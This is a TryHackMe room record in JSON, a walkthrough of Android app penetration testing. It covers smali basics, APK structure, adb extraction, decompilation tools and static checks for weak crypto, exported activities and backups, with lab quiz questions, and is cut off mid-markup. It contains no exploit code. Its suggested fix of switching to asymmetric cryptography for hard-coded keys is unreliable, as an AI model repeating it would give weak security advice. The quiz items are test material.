{'image': 'https://tryhackme-images.s3.amazonaws.com/room-icons/d8034445c4e1e80653375fa3d8bbceaf.png', 'title': 'Android Hacking 101', 'description': 'Android Mobile Application Penetration Testing', 'code': 'androidhacking101', 'users': 9304, 'tags': ['security', 'android', 'reversing', 'frida'], 'type': 'walkthrough', 'difficulty': 'medium', 'userCompleted': False, 'upVotes': 392, 'created': '2019-10-30T21:00:00.261Z', 'published': '2020-09-02T22:09:00.350Z', 'freeToUse': True, 'businessOnly': False, 'headerImage': 'https://i.imgur.com/IYYCiAQ.png', 'creator': 'stuxnet', 'tasks': [{'taskTitle': 'Introduction', 'taskDesc': '<p></p><p></p><p>It is common to find mobile applications when we are conducting a security audit or doing bug bounty programs, so I decided to create this room where we will see a set of tests that I do when I am doing this type of audit.</p><p><code>What is Native And Hybrid Applications?</code><b><span style="font-size:24px"></span></b></p><p>Native: They are those developed applications only and exclusively for mobile operating systems, either Android or IOS. In Android you use the Java or kotlin programming language, while in IOS you make use of Swift or Objective-C. These programming languages are the official ones for the respective operating systems.</p><p><span style="font-size:1rem">Hybrid: These applications use technologies such as HTML, CSS and JavaScript, all of these linked and processed through frameworks such as Apache Córdova "PhoneGap", Ionic, among others.</span></p><p><code>What is android\'s SMALI code?</code></p><p>When you create an application code, the apk file contains a .dex file, which contains binary Dalvik bytecode. Smali is an assembly language that runs on Dalvik VM, which is Android\'s JVM.</p><p>Example:</p><p style="text-align:center"></p><p style="text-align:center"><img src="https://i.imgur.com/6cuKcO5.png" style="width:663px;height:333.094px" /><br /></p><p style="text-align:center"></p><p style="text-align:center"><img src="https://1.bp.blogspot.com/-JhditcLrkBc/XbhSEl1lEEI/AAAAAAAAAN4/8JAua7PwxUg_unZ3rN8C3QfXUgjJ83miACLcBGAsYHQ/s1600/Screenshot_2.png" style="width:1015.99px" /><br /></p><p style="text-align:left"><b><span style="font-size:24px">Smali Syntax – Types</span></b><br /></p><p style="text-align:center"><br /></p><p style="text-align:center"><img src="https://1.bp.blogspot.com/-k1GyV_ONGE0/XbhSEYkh6GI/AAAAAAAAAN0/-_omCRXT8Ug6ejGsPbiON3lhq9Xun0kwACLcBGAsYHQ/s1600/Screenshot_3.png" style="width:995px" /><br /></p><p style="text-align:left"><span style="font-size:24px;font-weight:700">Smali\xa0</span><span style="font-size:24px"><b>Registers by\xa0JesusFreke</b></span></p><b>Introduction</b><p></p><p></p><p style="margin-bottom:16px;color:rgb(36, 41, 46);font-family:-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;">In dalvik\'s bytecode, registers are always 32 bits, and can hold any type of value. 2 registers are used to hold 64 bit types (Long and Double).</p><b>Specifying the number of registers in a method</b><p></p><p></p><p style="margin-bottom:16px;color:rgb(36, 41, 46);font-family:-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;">There are two ways to specify how many registers are available in a method. the .registers directive specifies the\xa0<span style="font-weight:600">total</span>\xa0number of registers in the method, while the alternate .locals directive specifies the number of\xa0<span style="font-weight:600">non-parameter</span>\xa0registers in the method. The total number of registers would therefore include the registers needed to hold the method parameters.</p><b>How method parameters are passed into a method</b><p></p><p></p><p style="margin-bottom:16px;color:rgb(36, 41, 46);font-family:-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;">When a method is invoked, the parameters to the method are placed into the last n registers. If a method has 2 arguments, and 5 registers (v0-v4), the arguments would be placed into the last 2 registers - v3 and v4.</p><p style="margin-bottom:16px;color:rgb(36, 41, 46);font-family:-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;">The first parameter to a non-static methods is always the object that the method is being invoked on.</p><p style="margin-bottom:16px;color:rgb(36, 41, 46);font-family:-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;">For example, let\'s say you are writing a non-static method\xa0<code>LMyObject;-&gt;callMe(II)V</code>. This method has 2 integer parameters, but it also has an implicit LMyObject; parameter before both integer parameters, so there are a total of 3 arguments to the method.</p><p style="margin-bottom:16px;color:rgb(36, 41, 46);font-family:-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;">Let\'s say you specify that there are 5 registers in the method (<code>v0</code>-<code>v4</code>), with either the\xa0<code>.registers 5</code>\xa0directive or the\xa0<code>.locals 2</code>\xa0directive (i.e. 2\xa0<em>local</em>\xa0registers + 3 parameter registers). When the method is invoked, the object that the method is being invoked on (i.e. the\xa0<code>this</code>\xa0reference) will be in\xa0<code>v2</code>, the first integer parameter will be in\xa0<code>v3</code>, and the second integer parameter will be in\xa0<code>v4</code>.</p><p style="margin-bottom:16px;color:rgb(36, 41, 46);font-family:-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;">For static methods it\'s the same thing, except there isn\'t an implicit\xa0<code>this</code>\xa0argument.</p><b>Register names</b><p></p><p></p><p style="margin-bottom:16px;color:rgb(36, 41, 46);font-family:-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;">There are two naming schemes for registers - the normal\xa0<em>v</em>\xa0naming scheme and the\xa0<em>p</em>\xa0naming scheme for parameter registers. The first register in the\xa0<em>p</em>\xa0naming scheme is the first parameter register in the method. So let\'s go back to the previous example of a method with 3 arguments and 5 total registers. The following table shows the normal\xa0<em>v</em>\xa0name for each register, followed by the\xa0<em>p</em>\xa0name for the parameter registers</p><table style="border-spacing:0px;margin-top:0px;margin-bottom:16px;display:block;width:710.017px;overflow:auto;color:rgb(36, 41, 46);font-family:-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;"><thead><tr><th>Local</th><th>Param</th><th></th></tr></thead><tbody><tr><td>v0</td><td></td><td>the first local register</td></tr><tr><td>v1</td><td></td><td>the second local register</td></tr><tr><td>v2</td><td>p0</td><td>the first parameter register</td></tr><tr><td>v3</td><td>p1</td><td>the second parameter register</td></tr><tr><td>v4</td><td>p2</td><td>the third parameter register</td></tr></tbody></table><p style="margin-bottom:16px;color:rgb(36, 41, 46);font-family:-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;">You can reference parameter registers by either name - it makes no difference.</p><b>Motivation for introducing parameter registers</b><p></p><p></p><p style="margin-bottom:16px;color:rgb(36, 41, 46);font-family:-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;">The\xa0<em>p</em>\xa0naming scheme was introduced as a practical matter, to solve a common annoyance when editing smali code.</p><p style="margin-bottom:16px;color:rgb(36, 41, 46);font-family:-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;">Say you have an existing method with a number of parameters and you are adding some code to the method, and you discover that you need an extra register. You think "No big deal, I\'ll just increase the number of registers specified in the .registers directive!".</p><p style="margin-bottom:16px;color:rgb(36, 41, 46);font-family:-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;">Unfortunately, it isn\'t quite that easy. Keep in mind that the method parameters are stored in the\xa0<span style="font-weight:600">last</span>\xa0registers in the method. If you increase the number of registers - you change which registers the method arguments get put into. So you would have to change the .registers directive\xa0<span style="font-weight:600">and</span>\xa0renumber every parameter register.</p><p style="margin-bottom:16px;color:rgb(36, 41, 46);font-family:-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;">But if the\xa0<em>p</em>\xa0naming scheme was used to reference parameter registers throughout the method, you can easily change the number of registers in the method, without having to worry about renumbering any existing registers.</p><p style="margin-bottom:16px;color:rgb(36, 41, 46);font-family:-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;">Note: by default baksmali will use the\xa0<em>p</em>\xa0naming scheme for parameter registers. If you want to disable this for some reason and force baksmali to always use the\xa0<em>v</em>\xa0naming scheme, you can use the -p/--no-parameter-registers option.</p><b>Long/Double values</b><p></p><p></p><p style="margin-bottom:16px;color:rgb(36, 41, 46);font-family:-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;">As mentioned previously, long and double primitives (J and D respectively) are 64 bit values, and require 2 registers. This is important to keep in mind when you are referencing method arguments. For example, let\'s say you have a (non-static) method LMyObject;-&gt;MyMethod(IJZ)V. The parameters to the method are LMyObject;, int, long, bool. So this method would require 5 registers for all of its parameters.</p><table style="border-spacing:0px;margin-top:0px;margin-bottom:16px;display:block;width:710.017px;overflow:auto;color:rgb(36, 41, 46);font-family:-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;"><thead><tr><th>Register</th><th>Type</th></tr></thead><tbody><tr><td>p0</td><td>this</td></tr><tr><td>p1</td><td>I</td></tr><tr><td>p2, p3</td><td>J</td></tr><tr><td>p4</td><td>Z</td></tr></tbody></table><p style="color:rgb(36, 41, 46);font-family:-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;;margin-bottom:0px">Also, when you are invoking the method later on, you do have to specify both registers for any double-wide arguments in the register list for the invoke-<span style="font-weight:600">instruction.</span></p><p style="text-align:left"><br /></p><p style="text-align:left"><code>Application Structure. (APK)</code></p><p style="text-align:center"><img src="https://1.bp.blogspot.com/-Of4B3eX-r24/XbhSEPc1wdI/AAAAAAAAANw/IbhJvb8tsb0Oc-wIwyfFfCMURWm6GEbOQCLcBGAsYHQ/s1600/Screenshot_1.png" style="width:548.976px" /><br /></p><p><b>AndroidManifest.xml</b>: the manifest file in binary XML format.</p><p><b>classes.dex:</b> application code compiled in the dex format.</p><p><b>resources.arsc:</b> file containing precompiled application resources, in binary XML.</p><p><b>res/:</b> folder containing resources not compiled into resources.arsc</p><p><b>assets/:</b> optional folder containing applications assets, which can be retrieved by AssetManager.</p><p><b>lib/:</b> optional folder containing compiled code - i.e. native code libraries.</p><p><b>META-INF/:</b> folder containing the MANIFEST.MF file, which stores meta data about the contents of the JAR. which sometimes will be store in a folder named original.The signature of the APK is also stored in this folder.</p><p>Every APK file includes an AndroidManifest.xml file which declares the application’s package name, version components and other metadata. Full detail of Android manifest specs file can be view here. Below is just some common attributes that can identify in AndroidManifest.<br /></p><table class="table table-hover table-striped" style="border-spacing:0px;background-color:rgb(255, 255, 255);width:847px;margin-bottom:21px;color:rgb(51, 51, 51);font-family:&quot;Open Sans&quot;, Calibri, Candara, Arial, sans-serif;font-size:15px;text-align:justify"><thead><tr><th>Attributes</th><th>Notes</th></tr></thead><tbody><tr><td>Manifest tag</td><td>contains android installation mode, package name, build versions</td></tr><tr><td>Permissions</td><td>custom permission and protection level</td></tr><tr><td>uses-permissions</td><td>requests a permission that must be granted in order for it to operate, full list of permission api can refer\xa0<a href="https://developer.android.com/reference/android/Manifest.permission.html">here</a>.</td></tr><tr><td>uses-feature</td><td>Declares a single hardware or software feature that is used by the application.</td></tr><tr><td>Application</td><td>The declaration of the application. Will contains all the activity</td></tr><tr><td>Activity</td><td>Declares an activity that implements part of the application visual user interface.</td></tr><tr><td>intent-filter</td><td>Specifies the types of intents that an activity, service, or broadcast receiver can respond to.</td></tr><tr><td>service</td><td>Declare a service as one of the application components.</td></tr><tr><td>receiver</td><td>Broadcast receivers enable applications to receive intents that are broadcast by the system or by other applications, even when other components of the application are not running.</td></tr><tr><td>provider</td><td>Declares a content provider component. A content provider is a subclass of ContentProvider that supplies structured access to data managed by the application.</td></tr></tbody></table><p></p><p></p>', 'taskType': 'none', 'taskNo': 1, 'taskCreated': '2019-10-28T17:05:34.432Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Read the above.<br /></p>', 'hint': ''}]}, {'taskTitle': 'Setup the environment', 'taskDesc': '<p>In this room it\'s time for setting up the environment, here we\'re going to talk about recommended tools for interact with our applications.</p><p><code><span style="font-size:24px">Install Java Development Kit 1.7</span></code><span style="font-size:24px;white-space:pre"></span></p><p><span style="font-size:1rem">The JDK is a development environment for building applications, applets, and components using the Java programming language.</span></p><p><a href="https://www.java.com/en/download">Install Java</a><span style="font-size:1rem"><br /></span></p><p><a href="https://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html">Java Development Kit 1.7</a></p><div><code><span style="font-size:36px">Emulators</span></code><span style="font-size:48px"></span></div><div><br /></div><div><div>An Android emulator is an Android Virtual Device, that represents a specific Android device. You can use an Android emulator as a target platform to run and test your Android applications on your PC.</div><div><br /></div><div>Don\'t necesary Install emulator if have a rooted phone. My favorite emulator for windows, linux and Mac is Genymotion as it is very easy to use. Create account and download the installer for your platform/Operating system.</div><div><br /></div><div><a href="https://www.genymotion.com/">Genymotion Android Emulator</a><br /></div></div><div><br /></div><div><br /></div><div style="text-align:center"><img src="https://www.genymotion.com/wp-content/uploads/2016/12/logo-genymotion-by-genymobile.png" style="width:326px;height:274.094px" /><br /></div><div><br /></div><div><div><div>Install genymotion and login in your account in the aplication, now download your favorite android version for testing. I personally recommend 6.0.</div></div></div><div><br /></div><p style="text-align:center"></p><p style="text-align:center"><img src="https://miro.medium.com/max/2732/1*HqGwxonHtlKRpiprDfq_Pg.png" style="width:1012px" /><br /></p><p style="text-align:left">For windows and mac users other option is Nox emulator</p><p style="text-align:left"><a href="https://www.bignox.com/">Nox Emulator</a></p><p style="text-align:left"><code><span style="font-size:24px">Enable Developer options in your emulator or rooted phone</span></code><span style="font-size:24px">\ufeff</span></p><p style="text-align:left">Is necessary active this function for use debug usb.</p><p>You can unlock the Developer options on any Android smartphone or tablet by locating the Build number in your Settings menu and tapping it multiple times. However, the exact location of the aforementioned build number may differ depending on your phone’s manufacturer.</p><div>Settings &gt; About Phone &gt; Build number &gt; Tap it 7 times to become developer;</div><div><br /></div><div><img src="https://www.kingoapp.com/image/usb-debugging-5.0-1.png" style="width:960px" /></div><div><br /></div><div>Now,\xa0Settings &gt; Developer Options &gt; USB Debugging.</div><div><br /></div><div><img src="https://www.kingoapp.com/image/usb-debugging-5.0-2.png" style="width:960px" /></div><div><br /></div>', 'taskType': 'none', 'taskNo': 2, 'taskCreated': '2019-10-28T18:07:37.634Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Read the above.<br /></p>', 'hint': ''}]}, {'taskTitle': 'Methodology', 'taskDesc': '<p>My methodology for pentest\xa0android apps.</p><p style="text-align:center;"><img src="https://1.bp.blogspot.com/-6U7Gzb_Kmz4/XbhSFgXl9vI/AAAAAAAAAOA/aBOsPE8Lim8HevEL5VDsCsDw_ywCaVYZgCLcBGAsYHQ/s1600/Screenshot_7.png" style="width:863.993px;" /><br /></p>', 'taskType': 'none', 'taskNo': 3, 'taskCreated': '2019-10-28T19:43:15.260Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p><br /></p>', 'hint': ''}]}, {'taskTitle': 'Information Gathering', 'taskDesc': '<p style="text-align:center"><br /></p><p>Information collection is the first thing we need to do, as this information will guide us to the next stage in our penetration tests.</p><div><b>Black Box</b>:\xa0In penetration testing, black-box testing refers to a method where an ethical hacker has no knowledge of the system being attacked.</div><div><br /></div><div>How do I find the application of the organization?</div><div><br /></div><div>Easy,\xa0<span style="font-size:1rem"><b>play store</b>:\xa0is a digital distribution platform for mobile apps for devices with Android operating system.\xa0</span></div><div><br /><div style="text-align:center"></div><div style="text-align:center"><img src="https://1.bp.blogspot.com/-1krELglbOk4/XbhSGGGHjSI/AAAAAAAAAOQ/NNcqM9gx1CUWfAxfwk_kmSeBOtG2sIWbwCLcBGAsYHQ/s1600/Screenshot_8.png" style="width:1046.04px" /><br /></div><div style="text-align:center"><br /></div><div style="text-align:center"><img src="https://1.bp.blogspot.com/-F5jWpZwKQAM/XbhSGD5XMVI/AAAAAAAAAOI/XmPkbosY9EMlLDeW4S1wE3vg3ny9XVBZQCLcBGAsYHQ/s1600/Screenshot_9.png" style="width:976.997px" /><br /></div><div style="text-align:center"><br /></div><div style="text-align:left"><span style="font-weight:bolder">White Box</span>:\xa0White box penetration testing can also be called glass box penetration testing or clear box penetration testing. In any case, it\'s an approach to penetration testing that relies on the knowledge of the target system\'s internal configuration. It uses this information for the test cases.</div><div style="text-align:left"><br /></div><div style="text-align:left">In a real scenario the client\xa0it will give us the mobile app, users and passwords to perform the login and also a user manual of how the application works.</div><div style="text-align:left"><br /></div><div style="text-align:left"><code><span style="font-size:36px">Important</span></code><span style="font-size:36px">\ufeff</span><span style="font-size:36px"></span></div><div style="text-align:left"><br /></div><div style="text-align:left">Not use an online services for download the apk file,\xa0don\'t knows if we\'re analyzing the real app.<br /></div></div>', 'taskType': 'none', 'taskNo': 4, 'taskCreated': '2019-10-28T19:52:59.008Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>What is the package name of the\xa0Black Hat Europe?</p>', 'hint': ''}]}, {'taskTitle': 'Reversing', 'taskDesc': '<p style="text-align:center"><img src="https://reversecodes.files.wordpress.com/2016/12/apk-ripped.jpg" /></p><p style="text-align:center"><br /></p><p style="text-align:left">In this part we will extract the legitimate apk from emulator or the device and get the source code.</p><p style="text-align:left"><code><span style="font-size:36px">TOOL</span></code></p><p style="text-align:left"><b>Android Debug Bridge (ADB)</b>\xa0is a development tool that facilitates communication between an Android device and a personal computer.</p><p style="text-align:left"><a href="https://www.xda-developers.com/install-adb-windows-macos-linux/">How to Install ADB on Windows, macOS, and Linux</a></p><p style="text-align:left">Note: You need debug usb enable in your emulator or device.</p><p style="text-align:left"><b>How view devices?</b></p><p style="text-align:left"><code>adb devices</code></p><p style="text-align:left"><img src="https://1.bp.blogspot.com/-9LRRjROx5Dc/XbhSGAPA7UI/AAAAAAAAAOM/eAW8d9TstSgBPfLE_eXg7pyaLSTMbsLogCLcBGAsYHQ/s1600/de.png" style="width:473.993px" /><img style="width:436.997px" /></p><p style="text-align:left"><b>How extract apk?</b></p><p style="text-align:left">For this you need have installed the application in your device and know package name</p><p style="text-align:left"><code>adb shell pm path\xa0package_name</code></p><p style="text-align:left"><span style="font-size:1rem">This command p</span>rint the path to the APK of the given<br /></p><p style="text-align:left"><img src="https://1.bp.blogspot.com/-SZgJ7uGif1A/XbhSBXjgoRI/AAAAAAAAANQ/kAxiijq98IcL3ZCQFI1wPAgb8Z1-qddxgCLcBGAsYHQ/s1600/2019-10-28%2B15_07_17-Select%2BCommand%2BPrompt.png" style="width:700.99px" /><img style="width:700.99px" /></p><p><code>adb pull &lt;remote&gt; [&lt;locaDestination&gt;] </code><br /></p><p>This command\xa0pulls the file <b>remote </b>to <b>local</b>. If <b>local</b> isn’t specified, it will pull to the current folder.</p><p><img src="https://1.bp.blogspot.com/-qv_YAwNZUu0/XbhSBRoPNnI/AAAAAAAAANU/Svu-OtoY61YCw87HQbk9gYZ5gCTJiT-7gCLcBGAsYHQ/s1600/2019-10-28%2B15_12_48-Select%2BCommand%2BPrompt.png" style="width:873.993px" /><br /></p><p><code><span style="font-size:36px">Now,how a get source code?</span></code></p><p><span style="font-weight:bolder;font-size:1rem"><a href="https://github.com/skylot/jadx/releases/">jadx</a>:\xa0</span>The\xa0<span style="font-weight:700;font-size:1rem">jadx</span><span style="font-size:1rem">\xa0suite allows you to simply load an APK and look at its Java source code. What’s happening under the hood is that jADX is decompiling the APK to smali and then converting the smali back to Java.</span></p><p><b>Usage:</b></p><p><code>jadx -d [path-output-folder] [path-apk-or-dex-file]</code></p><p><img src="https://1.bp.blogspot.com/-c6lXRh1B01Y/XbhSBSFrFrI/AAAAAAAAANM/hWHM5_y1CUo_kJN9TWLHAWer5yMJpbd7wCLcBGAsYHQ/s1600/2.png" style="width:966.997px" /><br /></p><p><img src="https://1.bp.blogspot.com/-u7fpX8PLn6w/XbhSB3i8wAI/AAAAAAAAANY/yktEGUW53g4oNyAUkKWcGAO9oicg_koUgCLcBGAsYHQ/s1600/3.png" style="width:756.997px" /><br /></p><p><a href="https://sourceforge.net/projects/dex2jar/">Dex2Jar</a>:\xa0use dex2jar to convert an APK to a JAR file.</p><p><code>d2j-dex2jar.sh or .bat /path/application.apk</code></p><p><img src="https://1.bp.blogspot.com/-0-UigTjn75k/XbhSByN_RaI/AAAAAAAAANc/bDtRMqg8zJEVBwLpNkjVg1SUW4deRbrXwCLcBGAsYHQ/s1600/4.png" style="width:823.993px" /><br /></p><p>Once you have the JAR file, simply open it with\xa0<a href="http://java-decompiler.github.io/">JD-GUI</a>\xa0and you’ll see its Java code.</p><div><img src="https://1.bp.blogspot.com/-rjJmAfX6PfA/XbhSCaWUPkI/AAAAAAAAANg/PH07DWI_Iz8z5t9MN_TqEbdHMYoBKmCbQCLcBGAsYHQ/s1600/5.png" style="width:731.997px" /><br /></div><div><br /></div><div><a href="https://ibotpeaches.github.io/Apktool/install/">apktool</a>: This tool get a source code in smali.</div><div><br /></div><div><code>apktool d file.apk</code></div><div><br /></div><div><img src="https://1.bp.blogspot.com/-QcAGFBjR72Y/XbhSC5oLZgI/AAAAAAAAANk/PFtdPK3lfg0oO5XqzsfQ9Ne7IgyFJVSMgCLcBGAsYHQ/s1600/6.png" style="width:874.983px" /><br /></div><div><br /></div><div><img src="https://1.bp.blogspot.com/-gZ6rjaQp9io/XbhSDjr_l8I/AAAAAAAAANo/4t5U3rlxzP4Nx8M0K-KbvjE0M88xZAlAQCLcBGAsYHQ/s1600/7.png" style="width:553.993px" /><br /></div><div><br /></div><p><b>jadx-gui:\xa0</b><span style="color:rgb(36, 41, 46);font-family:-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;;font-size:1rem"><b>\xa0</b></span>UI version of jadx</p><p><code>jadx\\bin\\jadx-gui</code></p><p><img src="https://1.bp.blogspot.com/-5tc4y5f0_pk/XbhSDmw11vI/AAAAAAAAANs/CkEsROS7l0Y3HKbwM65V3A3rJymmcr_YgCLcBGAsYHQ/s1600/8.png" style="width:940.99px" /><br /></p>', 'taskType': 'none', 'taskNo': 5, 'taskCreated': '2019-10-28T20:42:30.103Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Tool for convert dex file to smali code?</p>', 'hint': 'd2j suite'}, {'questionNo': 2, 'question': '<p>Which is the option for build apps with apktool?</p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>What is the apk path of Black Hat Europe?<br /></p>', 'hint': ''}, {'questionNo': 4, 'question': '<p>Command for extract apk of\xa0<span style="font-size:1rem">Back Hat\xa0</span>Europe<span style="font-size:1rem">?</span></p><p><span style="font-size:1rem">Note: command and path</span></p>', 'hint': ''}]}, {'taskTitle': 'Static analysis', 'taskDesc': '<p style="text-align:center"><img src="https://miro.medium.com/max/1200/1*5oTwbxMbwRolbyc2cmGyNA.png" style="width:600px" /></p><p style="text-align:center"><br /></p><p style="text-align:left"><span style="color:rgba(0, 0, 0, 0.75);font-family:&quot;Source Serif Pro&quot;, serif;font-size:20px">Is done without running the program, what are we going to identify in this basic room?</span></p><ul><li>Weak or improper cryptography use</li><li>Exported Preference Activities</li><li>Apps which enable backups</li><li>Apps which are debuggable</li><li>App Permissions.</li><li>Firebase Instance(s)</li><li>Sensitive data in the code</li></ul><p><b><br /></b></p><p><b><span style="font-size:24px">Weak or improper cryptography use</span>:\xa0</b>Incorrect uses of encryption algorithm may result in sensitive data exposure, key leakage, broken authentication, insecure session and spoofing attack.</p><p>Example:\xa0For Java implementation, the following API is related to encryption. Review the parameters of the encryption implementation.\n\n</p><p><code>IvParameterSpec iv = new IvParameterSpec(initVector.getBytes("UTF-8"));</code></p><p><code>SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes("UTF-8"), "AES");</code></p><p>How to search this when I have the source code of the application? there is a super advanced tool and wonderful\xa0 called grep.</p><p><span style="background-color:rgb(234, 234, 237);color:rgb(196, 20, 20);font-family:SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;white-space:pre">grep -r "SecretKeySpec" *</span></p><p><span style="background-color:rgb(234, 234, 237);color:rgb(196, 20, 20);font-family:SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;white-space:pre">grep -rli "aes" *</span></p><p><span style="background-color:rgb(234, 234, 237);color:rgb(196, 20, 20);font-family:SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;white-space:pre">grep -rli "iv"</span></p><p><img src="https://1.bp.blogspot.com/-yFzwmvdmrro/Xbhxc1s3uNI/AAAAAAAAAPE/enG9sABuVMEJe2iGaCAfl36raQBE7ACNwCLcBGAsYHQ/s1600/aes1.png" style="width:747.986px" /><span style="background-color:rgb(234, 234, 237);color:rgb(196, 20, 20);font-family:SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;white-space:pre"><br /></span></p><p><img src="https://1.bp.blogspot.com/-OW5gmHxP0A4/Xbhxczvk_PI/AAAAAAAAAPI/wq4XIm9DH8wMICrlVj61Ba0OA8II0CzgACLcBGAsYHQ/s1600/aes2.png" style="width:722.986px" /><span style="background-color:rgb(234, 234, 237);color:rgb(196, 20, 20);font-family:SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;white-space:pre"><br /></span></p><p>Open the file with you favorite editor of text.\xa0Gedit/Vim/subl, etc… use this for revolse a puzzle in my ctf "LaxCTF".</p><p>in real life:</p><p><img src="https://1.bp.blogspot.com/-PeS9cOskamE/Xbhxc5-r07I/AAAAAAAAAPM/ilzv54-rsL4vIuTB3L1S4kXGyuOPpE60gCLcBGAsYHQ/s1600/aes3.png" style="width:922.986px" /><br /></p><p><b>Solution</b>: Use a\xa0cryptography asymmetric.</p><p><b><span style="font-size:24px">Exported Preference Activities:\xa0</span></b>As we know, Android\'s activity component is application screen(s) and the action(s) that applied on that screen(s) when we use the application. When as activity is found to be shared with other apps on the device therefore leaving it accessible to any other application on the device.</p><p>Okay, exploit this in dynamic analysis... How identify the\xa0<span style="font-size:1rem">activity</span><span style="font-size:1rem">\xa0is exported?</span></p><p>With your favorite editor of text.\xa0Gedit/Vim/subl, etc…\xa0open the\xa0AndroidManifest.xml or use cat and grep.</p><p><img src="https://1.bp.blogspot.com/-raOw0bsMObk/Xbh_Ea70y2I/AAAAAAAAAPw/UkkMhkn42ZMke8147wd8KqLEeWYRF7ffACLcBGAsYHQ/s1600/Screenshot_4.png" style="width:1046.04px" /></p><p><br /></p><p><code>cat AndroidManifest.xml | grep "activity" --color</code><br /></p><p><img src="https://1.bp.blogspot.com/-JQoE91tiK9w/Xbh_EnEzHFI/AAAAAAAAAP0/mUXAN4z0FOw9dIiSlejuAyxrefhlxz7gwCLcBGAsYHQ/s1600/Screenshot_5a.png" style="width:1046.04px" /><br /></p><p><span style="font-size:24px"><b>Apps which enable backups:</b></span>\xa0This is considered a security issue because people could backup your app via ADB and then get private data of your app into their PC.</p><ol><li>Shared preference.</li><li>directory returned by getFilesDir().</li><li>getDataBase(path) also includes files created by SQLiteOpenHelper.</li><li>files in directories created with getDir(Sring, int).</li><li>files on external storage returned by getExternalFilesDir (String type).</li></ol><div><p style="margin-bottom:1rem">How identify this<span style="font-size:1rem">?</span></p></div><div><p style="margin-bottom:1rem">With your favorite editor of text.\xa0Gedit/Vim/subl, etc…\xa0open the\xa0AndroidManifest.xml or use cat and grep.</p><p style="margin-bottom:1rem"><img src="https://1.bp.blogspot.com/-ikgMlJB-oLg/XbiETITaUkI/AAAAAAAAAQY/Fwk-jKT1RJc06kPLw3sxsWw_8AS7m6NlQCLcBGAsYHQ/s1600/back.png" style="width:335.99px" /></p><p style="margin-bottom:1rem"><span style="background-color:rgb(234, 234, 237)"><span style="font-size:14px;white-space:pre">cat AndroidManifest.xml | grep "android:allowBackup" --color</span></span></p><p style="margin-bottom:1rem"><img 